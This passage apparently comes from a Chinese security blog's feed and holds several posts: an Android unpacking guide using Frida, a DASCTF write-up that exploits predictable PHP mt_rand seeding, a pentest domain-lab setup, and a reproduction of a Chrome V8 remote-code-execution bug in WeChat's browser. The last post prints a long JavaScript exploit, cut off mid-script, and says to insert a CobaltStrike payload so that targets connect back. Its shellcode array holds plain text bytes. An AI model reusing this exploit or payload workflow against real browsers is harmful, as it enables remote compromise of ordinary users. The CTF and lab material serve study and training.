class="code"><pre><span class="line">Windows版本：https:&#x2F;&#x2F;dl.google.com&#x2F;android&#x2F;repository&#x2F;platform-tools-latest-windows.zip </span><br><span class="line">Mac版本：https:&#x2F;&#x2F;dl.google.com&#x2F;android&#x2F;repository&#x2F;platform-tools-latest-windows.zip </span><br><span class="line">Linux版本：https:&#x2F;&#x2F;dl.google.com&#x2F;android&#x2F;repository&#x2F;platform-tools-latest-linux.zip</span><br></pre></td></tr></table></figure><p>将文件下载下来，解压缩到自定义目录，并将目录添加到系统环境变量</p><p><img src="../../../../img/21-09-29/4.png" alt="Assassins小白"></p><p>然后 <code>cmd</code> 运行 <code>adb --version</code></p><p>显示版本信息就代表安装成功</p><p><img src="../../../../img/21-09-29/5.png" alt="Assassins小白"></p><p><strong>ADB基础命令</strong></p><p>Android开启调试模式等..</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb连接命令：adb connect ip:port</span><br><span class="line">adb断开命令：adb disconnect ip:port</span><br><span class="line"></span><br><span class="line">从手机中拉取信息放到本地电脑：adb pull &lt;手机路径&gt; &lt;PC路径&gt;</span><br><span class="line">从本地推送信息到手机上去：adb push &lt;PC路径&gt; &lt;手机路径&gt;</span><br></pre></td></tr></table></figure><p>使用 <code>adb devices</code> 命令列出当前和计算机连接的Android设备或者模拟器</p><p><img src="../../../../img/21-09-29/6.png" alt="Assassins小白"></p><p><code>device</code> 是设备连接状态</p><p>设备连接状态结果可能有四种：</p><ul><li><p><code>offline</code> 连接异常</p></li><li><p><code>device</code> 连接正常</p></li><li><p><code>unknown</code> 没有识别设备</p></li><li><p><code>unauthorized</code> 未经授权</p></li></ul><p><code>unauthorized</code> 是因为Android端还未接受<code>RSA</code>密钥，接收后状态就为 <code>device</code> ，如下</p><p><img src="../../../../img/21-09-29/7.png" alt="Assassins小白"></p><p>查看设备连接状态：<code>adb get-state</code></p><p>这条命令只会显示当前设备的状态</p><p><img src="../../../../img/21-09-29/8.png" alt="Assassins小白"></p><p>进入Android的shell模式命令：<code>adb shell</code></p><p>下载跟电脑版本一样的Android端 <code>frida</code></p><p>项目地址：<a href="https://github.com/frida/frida/releases/">https://github.com/frida/frida/releases/</a></p><p><img src="../../../../img/21-09-29/9.png" alt="Assassins小白"></p><p>把文件下载下来解压，然后使用<code>adb push</code>命令将文件上传到安卓 <code>/data/local/tmp</code> 目录下</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push C:\\Users\\梅川库子\\desktop\\frida-server-15.1.2-android-x86_64 /data/local/tmp</span><br></pre></td></tr></table></figure><p><img src="../../../../img/21-09-29/10.png" alt="Assassins小白"></p><p>然后进入Android的 <code>/data/local/tmp</code> 目录给 <code>frida</code> 文件加上 <code>777</code> 权限</p><p><img src="../../../../img/21-09-29/11.png" alt="Assassins小白"></p><p>后面启动 <code>frida</code> 需要 <code>root</code> 权限，得先获取手机的 <code>root</code> 权限</p><p>我这里使用的mumu模拟器的adb，默认就是root权限（mumu模拟器默认端口7555）</p><p><img src="../../../../img/21-09-29/12.png" alt="Assassins小白"></p><p>然后运行 <code>frida</code></p><p><img src="../../../../img/21-09-29/13.png" alt="Assassins小白"></p><p>运行了之后使用 <code>frida-ps -U</code> 查看Android进程，如果有，则代表 <code>Frida</code> 已经连接成功</p><p><img src="../../../../img/21-09-29/14.png" alt="Assassins小白"></p><p>然后我们把app运行起来，通过 <code>frida-ps -U</code> 找到进程</p><p>使用 <code>FRIDA-DEXDump</code> 工具来脱壳</p><p>项目地址：<a href="https://github.com/hluwa/FRIDA-DEXDump">https://github.com/hluwa/FRIDA-DEXDump</a></p><p>脚本参数：<code>-n</code> 指定进程名称；<code>-p</code> 指定pid</p><p>如果app处于手机顶层状态，直接运行 <code>python main.py</code> 即可脱壳</p><p><img src="../../../../img/21-09-29/15.png" alt="Assassins小白"></p><p>adb 命令查看Activity信息：<code>adb shell dumpsys activity top | find &quot;ACTIVITY&quot;</code></p><p>使用 <code>Jadx</code> 工具打开 <code>dump</code> 下来的 <code>dex</code> 文件</p><p>如果没找到，就把app卸载重新安装，然后再重新尝试</p><p>项目地址：<a href="https://github.com/skylot/jadx/releases">https://github.com/skylot/jadx/releases</a></p><p><img src="../../../../img/21-09-29/16.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> FRIDA-DEXDump </tag>
            
            <tag> 360壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2021伪随机数题</title>
      <link href="2021/09/09/DASCTF2021%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%98/"/>
      <url>2021/09/09/DASCTF2021%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>自能生羽翼，何必仰云梯</p><hr><span id="more"></span><p><strong>代码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$login</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!@<span class="keyword">isset</span>(<span class="variable">$login</span>[<span class="string">&#x27;cookie&#x27;</span>])||<span class="variable">$login</span>[<span class="string">&#x27;cookie&#x27;</span>] != @md5(<span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error!&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    mt_srand(substr(<span class="variable">$login</span>[<span class="string">&#x27;cookie&#x27;</span>],<span class="number">17</span>,<span class="number">7</span>));</span><br><span class="line">    <span class="variable">$content</span> = <span class="string">&quot;&lt;?php \$flag=&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$filename</span> = (<span class="keyword">string</span>)mt_rand().<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">    mt_srand(mt_rand());</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>] == mt_rand())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($&#123;<span class="variable">$_POST</span>[mt_rand()]&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>error_reporting(0)</code>        关闭所有PHP错误报告</p><p><code>session_start()</code>        初始化session</p><p><code>highlight_file(__FILE__)</code>        对当前文件进行语法高亮显示</p><p>开头先包含了一个 <code>flag.php</code> 文件进来，然后通过 <code>GET</code> 传入 <code>id</code> 赋值给 <code>login</code> 变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$login</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br></pre></td></tr></table></figure><p>判断，如果 <code>login</code> 里没有 <code>cookie</code> 这个参数，或者 <code>cookie</code> 参数不等于 <code>md5</code> 后的 <code>session flag</code> 值 ，满足一个条件，就直接 <code>die</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!@<span class="keyword">isset</span>(<span class="variable">$login</span>[<span class="string">&#x27;cookie&#x27;</span>])||<span class="variable">$login</span>[<span class="string">&#x27;cookie&#x27;</span>] != @md5(<span class="variable">$_SESSION</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error!&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure><p>满足这个条件很简单，<code>cookie</code> 设置 <code>flag=123456</code> ，然后把 <code>123456</code> 进行 <code>md5</code> 加密后传给<code>cookie</code></p><p><img src="../../../../img/21-09-09/1.png" alt="Assassins小白"></p><p>走进 <code>else</code> 里面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(substr(<span class="variable">$login</span>[<span class="string">&#x27;cookie&#x27;</span>],<span class="number">17</span>,<span class="number">7</span>));</span><br></pre></td></tr></table></figure><p>把传入的 <code>cookie</code> 值从第17位起，后面的7位截取出来做种子（我这里截取出来就是 <code>9800998</code> ），然后传给 <code>mt_srand()</code> 函数做种子</p><p><code>mt_scand(seed)</code> 这个函数分发种子，然后再通过 <code>mt_rand()</code> 函数来生成随机数</p><p>这个题的核心考点也就是关于这个函数使用不当产生的漏洞利用：<code>同一个种子下生成的随机数值是相同的</code></p><p><strong>网上有大佬做的实验：</strong></p><p>设置固定种子后，后面每次执行，随机数也都相同，这证明了破解随机种子的可行性</p><p><img src="../../../../img/21-09-09/2.png" alt="Assassins小白"></p><p><strong>再往下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="string">&quot;&lt;?php \$flag=&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>)mt_rand().<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">file_put_contents(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure><p>写入内容赋值给 <code>content</code> 变量里，变量 <code>flag</code> 应该是包含开头的 <code>flag.php</code>文件里面的</p><p>然后 <code>filename</code> 等于一个 <code>mt_rand()</code> 生成的随机数，使用我们的种子（9800998）生成一个随机数看看</p><p><img src="../../../../img/21-09-09/3.png" alt="Assassins小白"></p><p>生成的第一个随机数是：1160121479，证明我们生成的文件名应该就是 <code>1160121479.php</code></p><p><img src="../../../../img/21-09-09/4.png" alt="Assassins小白"></p><p>然后就是把第一行的内容写入到第二行的文件里面，生成文件</p><p><strong>继续往下</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mt_srand(mt_rand());</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>] == mt_rand())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($&#123;<span class="variable">$_POST</span>[mt_rand()]&#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现又使用了新的种子，我们在本地也模拟一下</p><p><img src="../../../../img/21-09-09/5.png" alt="Assassins小白"></p><p>发现使用新的种子生成的随机数是 <code>954576979</code>  <code>1277894509</code> …</p><p>得出后续的随机数后，继续往下跟</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>] == mt_rand())</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($&#123;<span class="variable">$_POST</span>[mt_rand()]&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断POST里面的 <code>key</code> 需要等于 <code>mt_rand()</code> 随机值，我们把新种子生成的第一个随机数 <code>954576979</code> 传进去</p><p><img src="../../../../img/21-09-09/6.png" alt="Assassins小白"></p><p>成功走进 <code>if</code> 里面，然后下面就是一个动态变量覆盖，不过他的值又需要下一个随机数，我们上面已经算出来了，下一个随机数是<code>1277894509</code> </p><p>然后我们把变量 <code>filename</code> 传给他，他可以直接请求到变量文件里面的 <code>flag</code> </p><p>最后一个语句就类似变成了 <code>file_get_contents($filename)</code> ，把 <code>flag</code> 文件给我们读取出来了</p><p><img src="../../../../img/21-09-09/7.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
            <tag> 伪随机数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试域环境搭建</title>
      <link href="2021/07/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>2021/07/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>他们想把你埋了，但你是一颗种子</p><hr><span id="more"></span><h3 id="基础信息"><a href="#基础信息" class="headerlink" title="基础信息"></a>基础信息</h3><p><strong>Windows 7</strong>：192.168.174.131        域成员机器</p><p><strong>Windows 10</strong>：192.168.174.132        域成员机器</p><p><strong>Server 2012</strong>：192.168.174.133        使用Server 2012做域控服务器</p><h3 id="安装域"><a href="#安装域" class="headerlink" title="安装域"></a>安装域</h3><p>域控的IP须是静态的，静态IP设置如下</p><p><img src="../../../../img/21-07-03/1.png" alt="Assassins小白"></p><p>更改域控计算机名，然后重启</p><p><img src="../../../../img/21-07-03/2.png" alt="Assassins小白"></p><p><strong>开始安装AD服务</strong></p><p>添加角色，一直默认下一步到 “服务器角色”，勾选Active Directory 域服务-&gt;添加功能，下一步</p><p><img src="../../../../img/21-07-03/3.png" alt="Assassins小白"></p><p>到这里点击安装</p><p><img src="../../../../img/21-07-03/4.png" alt="Assassins小白"></p><p>安装完成后，点击”将此服务器提升为域控制器”</p><p><img src="../../../../img/21-07-03/5.png" alt="Assassins小白"></p><p>添加新林，设置根域名为 pentest.local </p><p>PS：域名随意，但是最好不要填外网存在的域名，不然通外网解析容易出错</p><p><img src="../../../../img/21-07-03/6.png" alt="Assassins小白"></p><p>设置还原模式密码，下一步</p><p><img src="../../../../img/21-07-03/7.png" alt="Assassins小白"></p><p>一路默认下一步，然后点击安装</p><p><img src="../../../../img/21-07-03/8.png" alt="Assassins小白"></p><p>安装完后会自动重启，再登录的时候会看到账号名称发生了变化，变成了 PENTEST\Administrator </p><p>PS：这是域账号的登录模式，要登录一个域，需要在账号前面加上域名称和斜杠</p><p><img src="../../../../img/21-07-03/9.png" alt="Assassins小白"></p><p>域成员机器的DNS服务器设置成域控的IP，如下</p><p><img src="../../../../img/21-07-03/10.png" alt="Assassins小白"></p><h3 id="加入域"><a href="#加入域" class="headerlink" title="加入域"></a>加入域</h3><p>创建好域后，将Windows7和Windows10加入域，如下</p><p>域填写我们的域名字，计算机名随便填</p><p><img src="../../../../img/21-07-03/11.png" alt="Assassins小白"></p><p>输入域控本地管理员的账号密码，加入域</p><p><img src="../../../../img/21-07-03/12.png" alt="Assassins小白"></p><p>成功加入pentest.local域</p><p><img src="../../../../img/21-07-03/13.png" alt="Assassins小白"></p><p>Windows10相同的操作加入域</p><p><img src="../../../../img/21-07-03/14.png" alt="Assassins小白"></p><h3 id="添加域用户"><a href="#添加域用户" class="headerlink" title="添加域用户"></a>添加域用户</h3><p>重启，然后去域控给他们添加域用户</p><p>点击开始-&gt;管理工具</p><p><img src="../../../../img/21-07-03/15.png" alt="Assassins小白"></p><p>展开 pentest.local ，点击 Computers ，可以查看到域中新添加了两台计算机，分别是 win7和 win10</p><p>加入域后，还需要有域账号才能登录域</p><p><img src="../../../../img/21-07-03/16.png" alt="Assassins小白"></p><p>在域名上右键，新建-&gt;用户</p><p><img src="../../../../img/21-07-03/17.png" alt="Assassins小白"></p><p>添加域用户：win7</p><p><img src="../../../../img/21-07-03/18.png" alt="Assassins小白"></p><p>给域用户设置密码</p><p><img src="../../../../img/21-07-03/19.png" alt="Assassins小白"></p><p>添加两个域用户</p><p><img src="../../../../img/21-07-03/20.png" alt="Assassins小白"></p><p>然后去域成员账户登录</p><p>点击切换用户，使用域账号格式 (域名称\域用户) 进行登录</p><p><img src="../../../../img/21-07-03/21.png" alt="Assassins小白"></p><p><img src="../../../../img/21-07-03/22.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 域环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信默认浏览器存在Chrome V8引擎RCE漏洞复现</title>
      <link href="2021/04/18/%E5%BE%AE%E4%BF%A1%E9%BB%98%E8%AE%A4%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%9C%A8Chrome-V8%E5%BC%95%E6%93%8ERCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2021/04/18/%E5%BE%AE%E4%BF%A1%E9%BB%98%E8%AE%A4%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%9C%A8Chrome-V8%E5%BC%95%E6%93%8ERCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>须知少时凌云志，曾许人间第一流</p><hr><span id="more"></span><p>蛮好玩的，写个文章记录一下，原理还是利用的Chrome V8引擎的RCE，但是因为微信默认的是关闭沙盒，所以可以利用</p><p>新版微信使用系统默认浏览器打开url，但是 <code>mp.weixin.qq.com</code> 公众号子域默认还是使用微信内置浏览器打开，但新版升级了CEF，即使绕过了使用微信自带浏览器打开链接，也无法触发漏洞上线</p><p>CobaltStrike生成32位C#木马，复制里面的内容放到js的shellcode函数里面，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">ENABLE_LOG = <span class="literal">true</span>;</span><br><span class="line">IN_WORKER = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// run calc and hang in a loop</span></span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">0xfc</span>, <span class="number">0xe8</span>,<span class="number">0x20</span>, <span class="number">0x36</span>, <span class="number">0x2e</span>, <span class="number">0x31</span>, <span class="number">0x29</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x70</span>, <span class="number">0x70</span>, <span class="number">0x6c</span>, <span class="number">0x65</span>, <span class="number">0x57</span>, <span class="number">0x65</span>, <span class="number">0x62</span>, <span class="number">0x4b</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x2f</span>, <span class="number">0x35</span>, <span class="number">0x33</span>, <span class="number">0x37</span>, <span class="number">0x2e</span>, <span class="number">0x33</span>, <span class="number">0x36</span>, <span class="number">0x20</span>, <span class="number">0x28</span>, <span class="number">0x4b</span>, <span class="number">0x48</span>, <span class="number">0x54</span>, <span class="number">0x4d</span>, <span class="number">0x4c</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0x6c</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> not_optimised_out = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> target_function = (<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="number">0xdecaf0</span>) &#123;</span><br><span class="line">        not_optimised_out += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    not_optimised_out += <span class="number">1</span>;</span><br><span class="line">    not_optimised_out |= <span class="number">0xff</span>;</span><br><span class="line">    not_optimised_out *= <span class="number">12</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">    target_function(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> g_array;</span><br><span class="line"><span class="keyword">var</span> tDerivedNCount = <span class="number">17</span> * <span class="number">87481</span> - <span class="number">8</span>;</span><br><span class="line"><span class="keyword">var</span> tDerivedNDepth = <span class="number">19</span> * <span class="number">19</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cb</span>(<span class="params">flag</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0</span>);</span><br><span class="line">    g_array[<span class="number">0</span>] = <span class="number">0x1dbabe</span> * <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;c01db33f&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">String</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">oobAccess</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> this_ = <span class="built_in">this</span>;</span><br><span class="line">    <span class="built_in">this</span>.buffer = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">this</span>.buffer_view = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.page_buffer = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">this</span>.page_view = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.prevent_opt = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> kSlotOffset = <span class="number">0x1f</span>;</span><br><span class="line">    <span class="keyword">var</span> kBackingStoreOffset = <span class="number">0xf</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(<span class="number">0x1000</span>);</span><br><span class="line">            <span class="built_in">this</span>.slot = <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.page_buffer = <span class="keyword">new</span> LeakArrayBuffer();</span><br><span class="line">    <span class="built_in">this</span>.page_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="built_in">this</span>.page_buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">new</span> <span class="built_in">RegExp</span>(&#123; <span class="attr">toString</span>: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="string">&#x27;a&#x27;</span> &#125; &#125;);</span><br><span class="line">    cb(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DerivedBase</span> <span class="keyword">extends</span> <span class="title">RegExp</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="title">constructor</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">            <span class="comment">// var array = null;</span></span><br><span class="line">            <span class="built_in">super</span>(</span><br><span class="line">                <span class="comment">// at this point, the 4-byte allocation for the JSRegExp `this` object</span></span><br><span class="line">                <span class="comment">// has just happened.</span></span><br><span class="line">                &#123;</span><br><span class="line">                    toString: cb</span><br><span class="line">                &#125;, <span class="string">&#x27;g&#x27;</span></span><br><span class="line">                <span class="comment">// now the runtime JSRegExp constructor is called, corrupting the</span></span><br><span class="line">                <span class="comment">// JSArray.</span></span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// this allocation will now directly follow the FixedArray allocation</span></span><br><span class="line">            <span class="comment">// made for `this.data`, which is where `array.elements` points to.</span></span><br><span class="line">            this_.buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x80</span>);</span><br><span class="line">            g_array[<span class="number">8</span>] = this_.page_buffer;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// try&#123;</span></span><br><span class="line">    <span class="keyword">var</span> derived_n = <span class="built_in">eval</span>(<span class="string">`(function derived_n(i) &#123;</span></span><br><span class="line"><span class="string">        if (i == 0) &#123;</span></span><br><span class="line"><span class="string">            return DerivedBase;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span 